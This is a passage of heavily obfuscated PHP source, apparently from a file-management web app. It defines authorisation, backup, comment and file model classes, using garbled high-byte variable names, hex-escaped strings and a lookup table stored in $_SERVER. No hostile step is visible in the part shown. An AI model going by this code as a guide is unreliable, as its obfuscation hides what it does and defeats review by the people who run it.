$ßæ°±‘æ) != $ßæ°±‘æ) { continue; } if (($İ¥ôöØ & $á„©áë) != 0) { continue; } if (!$õÖÑÚšã) { $õÖÑÚšã = $úˆÈéäá; continue; } if (intval($õÖÑÚšã[$İûğİ‹[499]]) < $İ¥ôöØ) { $õÖÑÚšã = $úˆÈéäá; } } return $õÖÑÚšã ? $õÖÑÚšã[$İûğİ‹[484]] : !1; } public function findAuthReadOnly() { $»Ôšóœú = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $œ–Öë… = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($»Ôšóœú, $œ–Öë…); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $º´è¶Ø =& $_SERVER[åÄ¼Ùßš]; $Ä˜´ˆÛ = parent::listData(); $ßİÕ“šÏ = !1; foreach ($Ä˜´ˆÛ as $Ş§ØÂÚ¿) { if ($Ş§ØÂÚ¿[$º´è¶Ø[499]] <= 0 || $Ş§ØÂÚ¿[$º´è¶Ø[2039]] == $º´è¶Ø[231]) { continue; } if (!$ßİÕ“šÏ) { $ßİÕ“šÏ = $Ş§ØÂÚ¿; continue; } if ($ßİÕ“šÏ[$º´è¶Ø[499]] > $Ş§ØÂÚ¿[$º´è¶Ø[499]]) { $ßİÕ“šÏ = $Ş§ØÂÚ¿; } } return $ßİÕ“šÏ ? $ßİÕ“šÏ[$º´è¶Ø[484]] : $º´è¶Ø[12]; } public function listData($„‘ó¹ğ = false, $°™Òşëç = "\163\x6f\162\164", $ÇéÖ”È = false) { return parent::listData($„‘ó¹ğ, $°™Òşëç, $ÇéÖ”È); } public function update($…àˆ¢Ó, $Àö­İ×Å) { $’ıÃˆÔå =& $_SERVER[åÄ¼Ùßš]; $¯áşï = parent::listData($…àˆ¢Ó); $ş¸ˆğş† = $this->findByName($Àö­İ×Å[$’ıÃˆÔå[32]]); if (!$¯áşï || $ş¸ˆğş† && $ş¸ˆğş†[$’ıÃˆÔå[484]] != $¯áşï[$’ıÃˆÔå[484]]) { return !1; } $this->filterAuth($Àö­İ×Å[$’ıÃˆÔå[499]]); return parent::update($…àˆ¢Ó, $Àö­İ×Å); } public function remove($®ºŸ¤) { $õèÍÑ÷ã = parent::listData($®ºŸ¤); if (!$õèÍÑ÷ã || $õèÍÑ÷ã[$_SERVER[åÄ¼Ùßš][192]]) { return !1; } return parent::remove($®ºŸ¤); } public function add($¸²‰’ŞÀ = array()) { $¹Äş‘É­ =& $_SERVER[åÄ¼Ùßš]; if ($this->findByName($¸²‰’ŞÀ[$¹Äş‘É­[32]])) { return !1; } $–™“ê–¼ = array($¹Äş‘É­[32] => $¹Äş‘É­[12], $¹Äş‘É­[499] => 1, $¹Äş‘É­[2040] => $¹Äş‘É­[2027], $¹Äş‘É­[2039] => 1, $¹Äş‘É­[192] => 0, $¹Äş‘É­[2041] => 0); $¸²‰’ŞÀ = array_merge($–™“ê–¼, $¸²‰’ŞÀ); $¸²‰’ŞÀ[$¹Äş‘É­[2041]] = $this->getSort(); $this->filterAuth($¸²‰’ŞÀ[$¹Äş‘É­[499]]); return parent::insert($¸²‰’ŞÀ); } private function getSort() { $ƒŒì¾¦ =& $_SERVER[åÄ¼Ùßš]; $Ü¼Çîå½ = parent::listData(); $Ãıâ‚Çû = array_to_keyvalue($Ü¼Çîå½, $ƒŒì¾¦[12], $ƒŒì¾¦[2041]); return empty($Ãıâ‚Çû) ? 0 : max($Ãıâ‚Çû) + 1; } private function filterAuth(&$‰şôÉÂÚ) { if (!$‰şôÉÂÚ) { return; } $ñ½¦üÎ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ù°º°û = array(); foreach ($ñ½¦üÎ as $ª¶ı«áÛ) { if ($‰şôÉÂÚ & $ª¶ı«áÛ) { $Ù°º°û[] = $ª¶ı«áÛ; } } if (in_array(self::AUTH_ROOT, $Ù°º°û)) { $‰şôÉÂÚ = array_sum($ñ½¦üÎ); return; } $†Á·ãàè = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ù°º°û as $ª¶ı«áÛ) { if (isset($†Á·ãàè[$ª¶ı«áÛ])) { $Ù°º°û = array_merge($Ù°º°û, $†Á·ãàè[$ª¶ı«áÛ]); } } $Ù°º°û[] = self::AUTH_SHOW; $‰şôÉÂÚ = array_sum(array_unique($Ù°º°û)); } public function sort($½Ş•ÏÓ, $×”Åì¼) { return parent::update($½Ş•ÏÓ, $×”Åì¼); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\142\141\143\153\x75\160\114\151\x73\164"; public $field = array("\151\157", "\x6e\x61\x6d\x65", "\163\x74\141\164\x75\x73", "\x63\x6f\156\x74\145\x6e\164", "\155\141\156\165\141\154", "\162\145\163\x75\x6c\x74", "\x74\151\155\x65\106\x72\x6f\155", "\164\x69\155\x65\124\x6f"); public function config() { $«µãğéÕ =& $_SERVER[åÄ¼Ùßš]; Action($«µãğéÕ[2042])->taskInit(); $ë’Àåôæ = Model($«µãğéÕ[866])->get($«µãğéÕ[873]); $ë’Àåôæ = json_decode($ë’Àåôæ, !0); $ë’Àåôæ = is_array($ë’Àåôæ) ? $ë’Àåôæ : array(); $this->parseContent($ë’Àåôæ); unset($ë’Àåôæ[$«µãğéÕ[1786]]); Model($«µãğéÕ[1785])->cacheClear(); $×éËÚ Ì = $«µãğéÕ[2043]; $‘Á©ò«Á = Model($«µãğéÕ[2044])->findByKey($«µãğéÕ[1804], $×éËÚ Ì); if (!$‘Á©ò«Á) { $‘Á©ò«Á = array(); } if (isset($‘Á©ò«Á[$«µãğéÕ[207]])) { $‘Á©ò«Á[$«µãğéÕ[207]] = json_decode($‘Á©ò«Á[$«µãğéÕ[207]], !0); } if (isset($ë’Àåôæ[$«µãğéÕ[207]])) { $‘Á©ò«Á[$«µãğéÕ[207]][$«µãğéÕ[1789]] = $ë’Àåôæ[$«µãğéÕ[207]]; unset($ë’Àåôæ[$«µãğéÕ[207]]); } return array_merge($‘Á©ò«Á, $ë’Àåôæ); } public function listData($¾êÚ¶Ìê = false, $·«ĞÄÈ = "\155\157\144\x69\146\171\x54\151\x6d\145", $¢İ‘¿Œç = false) { $ß€Úå¯à = parent::listData($¾êÚ¶Ìê, $·«ĞÄÈ, !0); if (!$ß€Úå¯à) { return $ß€Úå¯à; } if ($¾êÚ¶Ìê) { $ß€Úå¯à = array($ß€Úå¯à); } foreach ($ß€Úå¯à as &$¶’˜ù–«) { $this->parseContent($¶’˜ù–«); } return $¾êÚ¶Ìê ? $ß€Úå¯à[0] : $ß€Úå¯à; } public function parseContent(&$àœü¹©í) { $ùîÄÔøü =& $_SERVER[åÄ¼Ùßš]; $™ÒÃæ«ì = _get($àœü¹©í, $ùîÄÔøü[171], $ùîÄÔøü[91]); if (!in_array($™ÒÃæ«ì, array($ùîÄÔøü[872], $ùîÄÔøü[1247]))) { $àœü¹©í[$ùîÄÔøü[171]] = $™ÒÃæ«ì == $ùîÄÔøü[91] ? $ùîÄÔøü[1247] : $ùîÄÔøü[872]; } } public function lastItem() { $à±Ôñ«œ = $this->listData(); return !empty($à±Ôñ«œ[0]) ? $à±Ôñ«œ[0] : null; } public function kill($ª¼§ù¦Ü) { $Â„—ÖÉ× =& $_SERVER[åÄ¼Ùßš]; $ğ™ğôË¦ = $this->listData($ª¼§ù¦Ü); if (!$ğ™ğôË¦ || empty($ğ™ğôË¦[$Â„—ÖÉ×[32]])) { return !0; } Task::kill($Â„—ÖÉ×[881]); Task::kill($Â„—ÖÉ×[900]); Task::kill($Â„—ÖÉ×[910]); $ıåéöØ¦ = $ğ™ğôË¦[$Â„—ÖÉ×[32]]; $æñå×™¼ = TEMP_FILES . $Â„—ÖÉ×[876] . $ıåéöØ¦ . $Â„—ÖÉ×[8]; IO::remove($æñå×™¼, !1); return $this->remove($ª¼§ù¦Ü); } public function remove($­“¸’Ü) { $Ç¤¨İ©İ = $this->listData($­“¸’Ü); if (!$Ç¤¨İ©İ) { return !0; } return $this->backupRemove($Ç¤¨İ©İ); } private function backupRemove($ï¹áÒ÷…) { parent::remove($ï¹áÒ÷…[$_SERVER[åÄ¼Ùßš][484]]); $“éá„û¢ = $this->backupPath($ï¹áÒ÷…); IO::remove($“éá„û¢, !1); return !0; } private function backupPath($ÈÍ½ õû) { $’¦é¨¸ =& $_SERVER[åÄ¼Ùßš]; $œü·ü¯ì = $ÈÍ½ õû[$’¦é¨¸[32]]; $½¼íîŠ” = Model($’¦é¨¸[866])->get($’¦é¨¸[867]); $„â¦µ = substr(md5($’¦é¨¸[868] . $½¼íîŠ” . $œü·ü¯ì), 0, 8); return "\x7b\x69\x6f\72{$ÈÍ½ õû[$’¦é¨¸[845]]}\x7d\x2f\x64\x61\x74\141\142\141\x73\145\x2f\x62\141\x63\x6b\x75\x70\x2f" . $œü·ü¯ì . $’¦é¨¸[11] . $„â¦µ; } public function start() { $ûôÅ´÷° =& $_SERVER[åÄ¼Ùßš]; if ($GLOBALS[$ûôÅ´÷°[6]][$ûôÅ´÷°[92]][$ûôÅ´÷°[2045]] != $ûôÅ´÷°[91]) { return !0; } $’­íúì = $this->config(); if (!$’­íúì || $’­íúì[$ûôÅ´÷°[1786]] != $ûôÅ´÷°[91]) { return !1; } if ($’­íúì[$ûôÅ´÷°[171]] == $ûôÅ´÷°[872]) { $¡Œ†¬Ìæ = Model($ûôÅ´÷°[866])->get($ûôÅ´÷°[1362]); if ($¡Œ†¬Ìæ == $ûôÅ´÷°[1363]) { $’­íúì[$ûôÅ´÷°[171]] = $ûôÅ´÷°[1247]; } } $è’œ«ĞŒ = $this->process(); foreach ($è’œ«ĞŒ as $…ÑÄ‘í) { if ($…ÑÄ‘í) { return Task::restart($…ÑÄ‘í[$ûôÅ´÷°[484]]); } } $§óñâÂ¡ = new Backup(); $÷º¹† = $§óñâÂ¡->db(); if ($÷º¹†) { $÷º¹† = $§óñâÂ¡->dbFile(); if ($÷º¹† && $’­íúì[$ûôÅ´÷°[171]] == $ûôÅ´÷°[872]) { $÷º¹† = $§óñâÂ¡->file(); } } Backup::set(array($ûôÅ´÷°[843] => 1, $ûôÅ´÷°[855] => time())); return !0; } public function process() { $ğÍãüãä =& $_SERVER[åÄ¼Ùßš]; $Æ¶Æá¯­ = array($ğÍãüãä[851] => Task::get($ğÍãüãä[881]), $ğÍãüãä[856] => Task::get($ğÍãüãä[900]), $ğÍãüãä[233] => Task::get($ğÍãüãä[910])); $½éÜÒ = !1; foreach ($Æ¶Æá¯­ as &$£óœÉÑè) { if ($½éÜÒ) { $£óœÉÑè = !1; continue; } if ($£óœÉÑè) { $Ööô¦¹ = intval(_get($£óœÉÑè, $ğÍãüãä[1822], 0)); if (time() - $Ööô¦¹ > 7200) { Task::kill($£óœÉÑè[$ğÍãüãä[484]]); $½éÜÒ = !0; $£óœÉÑè = !1; } } } return $Æ¶Æá¯­; } public function restore() { $Ë®™’Ö =& $_SERVER[åÄ¼Ùßš]; ActionCall($Ë®™’Ö[1168], !0, 1); ActionCall($Ë®™’Ö[1168], !0, 0); } } goto c„Ğ‡ÀÏ›¢; c„Ğ‡ÀÏ›¢: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\x6d\145" => "\x63\x6f\155\x6d\145\x6e\x74\137\x6d\x65\164\x61", "\155\145\x74\141\106\151\x65\154\x64" => "\143\157\x6d\155\145\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÑœíşØ) { $­‘–Š” =& $_SERVER[åÄ¼Ùßš]; if ($ÑœíşØ[$­‘–Š”[2046]]) { $‹Ü®æ‡Á = $this->where(array($­‘–Š”[2047] => $ÑœíşØ[$­‘–Š”[2046]]))->find(); if (!$‹Ü®æ‡Á || $‹Ü®æ‡Á[$­‘–Š”[191]] != $ÑœíşØ[$­‘–Š”[191]] || $‹Ü®æ‡Á[$­‘–Š”[582]] != $ÑœíşØ[$­‘–Š”[582]]) { return !1; } $this->where(array($­‘–Š”[2047] => $ÑœíşØ[$­‘–Š”[2046]]))->setAdd($­‘–Š”[2048], 1); } $ÑœíşØ[$­‘–Š”[2049]] = 0; $ÑœíşØ[$­‘–Š”[2048]] = 0; $ÑœíşØ[$­‘–Š”[843]] = 1; return $this->add($ÑœíşØ); } public function commentCount($¡¤¬Ú, $ÏÉÛÈª, $“ñÊÃş¿ = false) { $‰‘€÷ù =& $_SERVER[åÄ¼Ùßš]; if (!$¡¤¬Ú) { return array(); } if (is_string($¡¤¬Ú) || is_int($¡¤¬Ú)) { $¡¤¬Ú = array($¡¤¬Ú); } $Ã£õ´¯ = array($‰‘€÷ù[582], $‰‘€÷ù[2050] => $‰‘€÷ù[578]); $ŠÛ¿ÇÔ = array($‰‘€÷ù[582] => array($‰‘€÷ù[7], $¡¤¬Ú), $‰‘€÷ù[191] => $ÏÉÛÈª); if ($“ñÊÃş¿) { $ŠÛ¿ÇÔ[$‰‘€÷ù[1817]] = $“ñÊÃş¿; } $ºæ¸Éğ = $this->field($Ã£õ´¯)->where($ŠÛ¿ÇÔ)->group($‰‘€÷ù[582])->select(); return array_to_keyvalue($ºæ¸Éğ, $‰‘€÷ù[582], $‰‘€÷ù[578]); } public function starTarget($ïşí¹ò†, $ŒÕÚ öÈ) { $İ‘ÒéÕÑ =& $_SERVER[åÄ¼Ùßš]; $Ïöè¸ÃÏ = $ïşí¹ò† + self::TYPE_STAR_OFFSET; $£¨ÈÊË = array($İ‘ÒéÕÑ[1817] => USER_ID, $İ‘ÒéÕÑ[191] => $Ïöè¸ÃÏ, $İ‘ÒéÕÑ[582] => $ŒÕÚ öÈ); $ÃŸ–óİ = $this->where($£¨ÈÊË)->find(); if ($ÃŸ–óİ) { return $this->where(array($İ‘ÒéÕÑ[484] => $ÃŸ–óİ[$İ‘ÒéÕÑ[484]]))->delete(); } $ÊƒÃ§×÷ = array($İ‘ÒéÕÑ[2046] => 0, $İ‘ÒéÕÑ[1817] => USER_ID, $İ‘ÒéÕÑ[843] => 1, $İ‘ÒéÕÑ[171] => $İ‘ÒéÕÑ[12], $İ‘ÒéÕÑ[191] => $Ïöè¸ÃÏ, $İ‘ÒéÕÑ[582] => $ŒÕÚ öÈ, $İ‘ÒéÕÑ[2049] => 0, $İ‘ÒéÕÑ[2048] => 0); return $this->add($ÊƒÃ§×÷); } public function starTargetCount($áòÑĞê¾, $²™ÎÏ†ä) { $”Ü•Ùì› =& $_SERVER[åÄ¼Ùßš]; $ ¶Ö´Ù = $²™ÎÏ†ä + self::TYPE_STAR_OFFSET; $¬îÉä•ı = $this->commentCount($áòÑĞê¾, $ ¶Ö´Ù); $ÕœÚÏä = $this->commentCount($áòÑĞê¾, $ ¶Ö´Ù, USER_ID); return array($”Ü•Ùì›[2051] => $¬îÉä•ı, $”Ü•Ùì›[2052] => $ÕœÚÏä); } public function starTargetUserList($²©ùìŸ–, $ğ‚¬É¶) { $áæŞ¥§Ò =& $_SERVER[åÄ¼Ùßš]; $–¦ıˆ¬ü = $²©ùìŸ– + self::TYPE_STAR_OFFSET; $ÃúÙ×– = array($áæŞ¥§Ò[582] => $ğ‚¬É¶, $áæŞ¥§Ò[191] => $–¦ıˆ¬ü); $â™ÚìŸ¯ = $this->where($ÃúÙ×–)->count(); $Ğ¸‘œ™¢ = array($áæŞ¥§Ò[335] => $â™ÚìŸ¯, $áæŞ¥§Ò[2053] => array()); if (!$â™ÚìŸ¯) { return $Ğ¸‘œ™¢; } $ì„‹óã = $this->field($áæŞ¥§Ò[1817])->where($ÃúÙ×–)->limit(500)->select(); $ì„‹óã = array_to_keyvalue($ì„‹óã, $áæŞ¥§Ò[12], $áæŞ¥§Ò[1817]); $Ğ¸‘œ™¢[$áæŞ¥§Ò[2053]] = Model($áæŞ¥§Ò[590])->userListInfo($ì„‹óã); return $Ğ¸‘œ™¢; } public function prasiseUserList($›Ù„â—) { $âœñŞ¶À =& $_SERVER[åÄ¼Ùßš]; $òµ êÆµ = array($âœñŞ¶À[2054] => $›Ù„â—); $µİÏ×€À = $this->where($òµ êÆµ)->find(); $©ÊùÚƒ = _get($µİÏ×€À, $âœñŞ¶À[2049], 0); $àÔÍî¸î = array($âœñŞ¶À[335] => $©ÊùÚƒ, $âœñŞ¶À[2053] => array()); if (!$©ÊùÚƒ) { return $àÔÍî¸î; } $Ÿ¨“åşÙ = Model($âœñŞ¶À[2055])->field($âœñŞ¶À[1817])->where($òµ êÆµ)->limit(500)->select(); $Ÿ¨“åşÙ = array_to_keyvalue($Ÿ¨“åşÙ, $âœñŞ¶À[12], $âœñŞ¶À[1817]); $àÔÍî¸î[$âœñŞ¶À[2053]] = Model($âœñŞ¶À[590])->userListInfo($Ÿ¨“åşÙ); return $àÔÍî¸î; } public function remove($¶Š Õ»†) { $·šé÷ =& $_SERVER[åÄ¼Ùßš]; $û•ì‹§İ = array($·šé÷[2047] => $¶Š Õ»†); $èĞÆèëµ = $this->where($û•ì‹§İ)->find(); if ($èĞÆèëµ[$·šé÷[2046]]) { $this->where(array($·šé÷[2047] => $èĞÆèëµ[$·šé÷[2046]]))->setAdd($·šé÷[2048], -1); } return $this->removeArray($¶Š Õ»†); } public function edit($şÌä¿ôú, $¾ÀƒÉÚ×) { $¥èÜßï“ =& $_SERVER[åÄ¼Ùßš]; $…òø®ã– = array($¥èÜßï“[2047] => $şÌä¿ôú); return $this->where($…òø®ã–)->save(array($¥èÜßï“[2056] => $¾ÀƒÉÚ×)); } public function prasise($Â˜ĞÔüİ) { $¨Š¼‡€Ù =& $_SERVER[åÄ¼Ùßš]; $îë¹ÌÚù = Model($¨Š¼‡€Ù[2057]); $™Öç’÷Ü = array($¨Š¼‡€Ù[2047] => $Â˜ĞÔüİ, $¨Š¼‡€Ù[1808] => USER_ID); $­ ÷û¬å = $îë¹ÌÚù->where($™Öç’÷Ü)->find(); if (!$­ ÷û¬å) { $îë¹ÌÚù->add($™Öç’÷Ü); $ø’ü±Ñ” = $this->where(array($¨Š¼‡€Ù[2047] => $Â˜ĞÔüİ))->setAdd($¨Š¼‡€Ù[2049], 1); } else { $îë¹ÌÚù->where($™Öç’÷Ü)->delete(); $ø’ü±Ñ” = $this->where(array($¨Š¼‡€Ù[2047] => $Â˜ĞÔüİ))->setAdd($¨Š¼‡€Ù[2049], -1); } return $ø’ü±Ñ”; } public function targetInfo($ı‹íò, $˜ÖÃÓ®) { $äÂíúÛ¡ =& $_SERVER[åÄ¼Ùßš]; $–ª·§¦Û = array($äÂíúÛ¡[664] => $ı‹íò, $äÂíúÛ¡[665] => $˜ÖÃÓ®); $¹¾ùÂÈ = $this->where($–ª·§¦Û)->count(); $Éíã™÷º = "\x52\x49\107\110\124\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\143\x6f\155\155\x65\x6e\x74\137\160\x72\141\151\163\x65\x20\x73\x74\141\x72\x20\157\x6e\40\x63\157\x6d\155\x65\x6e\164\56\x63\x6f\x6d\155\x65\x6e\164\111\x44\x20\75\40\163\x74\141\162\x2e\x63\157\x6d\155\145\x6e\164\111\104"; $¼†çä¢ = $this->alias($äÂíúÛ¡[431])->where($–ª·§¦Û)->join($Éíã™÷º, $äÂíúÛ¡[2058])->count(); $±Ì‡–›Ä = array($äÂíúÛ¡[2059] => $¹¾ùÂÈ, $äÂíúÛ¡[2060] => $¼†çä¢); return $±Ì‡–›Ä; } public function listData($×—ã‚¸) { $šÊ¸‰ÎÃ =& $_SERVER[åÄ¼Ùßš]; if (isset($×—ã‚¸[$šÊ¸‰ÎÃ[2061]])) { if ($×—ã‚¸[$šÊ¸‰ÎÃ[2061]]) { $×—ã‚¸[$šÊ¸‰ÎÃ[2054]] = array($šÊ¸‰ÎÃ[1122], intval($×—ã‚¸[$šÊ¸‰ÎÃ[2061]])); } unset($×—ã‚¸[$šÊ¸‰ÎÃ[2061]]); } if (isset($×—ã‚¸[$šÊ¸‰ÎÃ[2062]])) { if ($×—ã‚¸[$šÊ¸‰ÎÃ[2062]]) { $×—ã‚¸[$šÊ¸‰ÎÃ[2054]] = array($šÊ¸‰ÎÃ[1119], intval($×—ã‚¸[$šÊ¸‰ÎÃ[2062]])); } unset($×—ã‚¸[$šÊ¸‰ÎÃ[2062]]); } return $this->_listData($×—ã‚¸); } private function _listData($Ú˜®¹º…) { $¥â¢Úºã =& $_SERVER[åÄ¼Ùßš]; $˜‹±Ô¶ = $this->where($Ú˜®¹º…)->_makeOrder()->selectPage(100); $this->_listAppendParent($˜‹±Ô¶[$¥â¢Úºã[447]]); $this->_listAppendUser($˜‹±Ô¶[$¥â¢Úºã[447]]); $this->_listAppendMeta($˜‹±Ô¶[$¥â¢Úºã[447]]); return $˜‹±Ô¶; } private function _makeOrder() { $ÂÛğÑå =& $_SERVER[åÄ¼Ùßš]; $÷õœ¢†Ë = array($ÂÛğÑå[2049], $ÂÛğÑå[2048], $ÂÛğÑå[234]); $ãâĞ˜¹Á = Input::get($ÂÛğÑå[541], $ÂÛğÑå[7], $ÂÛğÑå[509], $÷õœ¢†Ë); $ÁÁÔ¨· = Input::get($ÂÛğÑå[542], $ÂÛğÑå[7], $ÂÛğÑå[1810], array($ÂÛğÑå[2063], $ÂÛğÑå[537])); $ïšÕ‹Îî = $ãâĞ˜¹Á . $ÂÛğÑå[53] . $ÁÁÔ¨·; return $this->order($ïšÕ‹Îî); } private function _listAppendParent(&$µ¢¡“Âí) { $ĞÌ¤­ã„ =& $_SERVER[åÄ¼Ùßš]; $Ö†®·¸¨ = array_unique(array_to_keyvalue($µ¢¡“Âí, $ĞÌ¤­ã„[12], $ĞÌ¤­ã„[2046])); $Ö†®·¸¨ = array_remove_value($Ö†®·¸¨, $ĞÌ¤­ã„[231]); if (!$Ö†®·¸¨) { return; } $Ò™­Ú‘Ÿ = $this->where(array($ĞÌ¤­ã„[2047] => array($ĞÌ¤­ã„[7], $Ö†®·¸¨)))->select(); $Ò™­Ú‘Ÿ = array_to_keyvalue($Ò™­Ú‘Ÿ, $ĞÌ¤­ã„[2054]); foreach ($µ¢¡“Âí as &$†‹å­ƒû) { if (isset($Ò™­Ú‘Ÿ[$†‹å­ƒû[$ĞÌ¤­ã„[2046]]])) { $†‹å­ƒû[$ĞÌ¤­ã„[2064]] = $Ò™­Ú‘Ÿ[$†‹å­ƒû[$ĞÌ¤­ã„[2046]]]; } } unset($†‹å­ƒû); } private function _listAppendUser(&$º£“¬Ç¼) { $Ôü¸ÙÑæ =& $_SERVER[åÄ¼Ùßš]; $¬ûÍ¤ï = array_unique(array_to_keyvalue($º£“¬Ç¼, $Ôü¸ÙÑæ[12], $Ôü¸ÙÑæ[1817])); $¬ûÍ¤ï = array_remove_value($¬ûÍ¤ï, $Ôü¸ÙÑæ[231]); if (count($¬ûÍ¤ï) == 0) { return; } foreach ($º£“¬Ç¼ as $×ëçŞËÊ) { if (isset($×ëçŞËÊ[$Ôü¸ÙÑæ[2064]])) { $¬ûÍ¤ï[] = $×ëçŞËÊ[$Ôü¸ÙÑæ[2064]][$Ôü¸ÙÑæ[1817]]; } } $’ıÎñßµ = Model($Ôü¸ÙÑæ[610])->userListInfo($¬ûÍ¤ï); foreach ($º£“¬Ç¼ as &$×ëçŞËÊ) { $×ëçŞËÊ[$Ôü¸ÙÑæ[678]] = $’ıÎñßµ[$×ëçŞËÊ[$Ôü¸ÙÑæ[1817]]]; if (isset($×ëçŞËÊ[$Ôü¸ÙÑæ[2064]])) { $×ëçŞËÊ[$Ôü¸ÙÑæ[2064]][$Ôü¸ÙÑæ[678]] = $’ıÎñßµ[$×ëçŞËÊ[$Ôü¸ÙÑæ[2064]][$Ôü¸ÙÑæ[1817]]]; } } unset($×ëçŞËÊ); } private function _listAppendMeta(&$õĞêù–›) { $õŞ‹˜© =& $_SERVER[åÄ¼Ùßš]; $Ğ•æ¬³Œ = array_unique(array_to_keyvalue($õĞêù–›, $õŞ‹˜©[12], $õŞ‹˜©[2054])); $Ğ•æ¬³Œ = array_remove_value($Ğ•æ¬³Œ, $õŞ‹˜©[231]); if (!$Ğ•æ¬³Œ) { return; } foreach ($õĞêù–› as $’Òöù–) { if (isset($’Òöù–[$õŞ‹˜©[2064]])) { $Ğ•æ¬³Œ[] = $’Òöù–[$õŞ‹˜©[2064]][$õŞ‹˜©[2054]]; } } $Ÿ­­§Šã = $this->metaList($Ğ•æ¬³Œ); if (!$Ÿ­­§Šã) { return !1; } foreach ($õĞêù–› as &$’Òöù–) { $’Òöù–[$õŞ‹˜©[552]] = $Ÿ­­§Šã[$’Òöù–[$õŞ‹˜©[2054]]]; if (isset($’Òöù–[$õŞ‹˜©[2064]])) { $’Òöù–[$õŞ‹˜©[2064]][$õŞ‹˜©[552]] = $Ÿ­­§Šã[$’Òöù–[$õŞ‹˜©[2064]][$õŞ‹˜©[2054]]]; } } unset($’Òöù–); } private function metaList($ ö´¨Ÿ›) { $ĞğĞÌ´Ø =& $_SERVER[åÄ¼Ùßš]; if (!$ ö´¨Ÿ›) { return array(); } $†·ÉñÚä = array($ĞğĞÌ´Ø[2054] => array($ĞğĞÌ´Ø[7], $ ö´¨Ÿ›)); $ÌÇßÖæ£ = Model($ĞğĞÌ´Ø[2065])->where($†·ÉñÚä)->select(); $ÌÇßÖæ£ = array_to_keyvalue_group($ÌÇßÖæ£, $ĞğĞÌ´Ø[2054]); foreach ($ÌÇßÖæ£ as $¦èµÓü¼ => $êƒ ôæ) { $¢ú‚Şä = array(); foreach ($êƒ ôæ as $¼Ñı‘÷) { $¢ú‚Şä[$¼Ñı‘÷[$ĞğĞÌ´Ø[97]]] = $¼Ñı‘÷[$ĞğĞÌ´Ø[452]]; } $ÌÇßÖæ£[$¦èµÓü¼] = $¢ú‚Şä; } return $ÌÇßÖæ£ ? $ÌÇßÖæ£ : array(); } public function removeTarget($ì¨ôÃ™Â, $€ÓÔà”º) { $ƒî¬£Õå =& $_SERVER[åÄ¼Ùßš]; if (!$€ÓÔà”º) { return !0; } $€ÓÔà”º = is_array($€ÓÔà”º) ? $€ÓÔà”º : array($€ÓÔà”º); $¶ûç‰ƒµ = array($ƒî¬£Õå[191] => $ì¨ôÃ™Â, $ƒî¬£Õå[582] => array($ƒî¬£Õå[7], $€ÓÔà”º)); $ë€ó = $this->field($ƒî¬£Õå[2054])->where($¶ûç‰ƒµ)->select(); $Ñ–ÆïùÊ = array_to_keyvalue($ë€ó, $ƒî¬£Õå[12], $ƒî¬£Õå[2054]); return $this->removeArray($Ñ–ÆïùÊ); } public function removeArray($€ä›¡»î) { $Áß²¯§’ =& $_SERVER[åÄ¼Ùßš]; if (!$€ä›¡»î) { return !0; } $€ä›¡»î = is_array($€ä›¡»î) ? $€ä›¡»î : array($€ä›¡»î); $Ş©â° = array($Áß²¯§’[2054] => array($Áß²¯§’[7], $€ä›¡»î)); Model($Áß²¯§’[2057])->where($Ş©â°)->delete(); Model($Áß²¯§’[2066])->where($Ş©â°)->delete(); return $this->where($Ş©â°)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\x6c\145\137\143\157\156\x74\x65\x6e\164\163"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\151\x6d\145", "\164\151\x6d\x65", "\151\156\x73\145\162\x74", "\x66\x75\x6e\x63\164\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\x65"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\x65" => "\x69\157\x5f\146\x69\154\145\x5f\x6d\145\164\141", "\155\145\164\x61\106\x69\x65\154\x64" => "\146\151\154\x65\111\x44"); public function fileInfo($ïášúåÃ) { $ŠÍÂº÷„ =& $_SERVER[åÄ¼Ùßš]; static $ùñœ˜‰¢ = array(); if (!isset($ùñœ˜‰¢[$ïášúåÃ])) { $Üû±åÇŠ = $ŠÍÂº÷„[2067]; $á”™•š® = Model($ŠÍÂº÷„[557])->field($Üû±åÇŠ)->where(array($ŠÍÂº÷„[555] => $ïášúåÃ))->find(); $ùñœ˜‰¢[$ïášúåÃ] = $á”™•š®; } return $ùñœ˜‰¢[$ïášúåÃ]; } public function addFileByContent($Ê¡ìÃÙî = '', $©Û¢ñü±, $Á‹á©Ùµ = '') { $†±½Ó’ñ =& $_SERVER[åÄ¼Ùßš]; $À»› ™µ = TEMP_PATH . $†±½Ó’ñ[2068]; if (!is_dir($À»› ™µ)) { mk_dir($À»› ™µ); } $Óó©¾©Å = $À»› ™µ . $†±½Ó’ñ[2069] . rand_string(16); $š‰ñ’Íå = file_put_contents($Óó©¾©Å, $Ê¡ìÃÙî); if ($š‰ñ’Íå === !1 || strlen($Ê¡ìÃÙî) != $š‰ñ’Íå) { return !1; } $Ô×œ”…À = $this->addFile($Óó©¾©Å, $©Û¢ñü±, $Á‹á©Ùµ, !0); if (file_exists($Óó©¾©Å)) { @unlink($Óó©¾©Å); } return $Ô×œ”…À; 